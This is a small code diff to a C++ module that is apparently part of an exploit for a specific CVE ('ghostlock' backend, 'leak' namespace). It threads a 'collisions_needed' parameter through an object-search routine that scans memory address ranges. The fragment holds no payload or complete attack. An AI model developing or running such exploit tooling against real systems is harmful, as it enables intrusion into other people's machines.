@@ -55,9 +55,11 @@ namespace ghostlock::backend::cve_2026_43499::leak {
     [[nodiscard]] ObjectOutcome find_object(const ScanStrides &strides, const ScanRange &range,
                                             bool sweep_tags, const Buckets &buckets,
                                             const std::uint64_t *addresses,
-                                            std::size_t address_count) noexcept {
+                                            std::size_t address_count,
+                                            std::size_t collisions_needed) noexcept {
         const SearchOutcome searched =
-            search_for_object(strides, range, sweep_tags, buckets, addresses, address_count);
+            search_for_object(strides, range, sweep_tags, buckets, addresses, address_count,
+                              collisions_needed);
         ObjectOutcome outcome{};
         outcome.probes = searched.probes;
         switch (searched.status) {
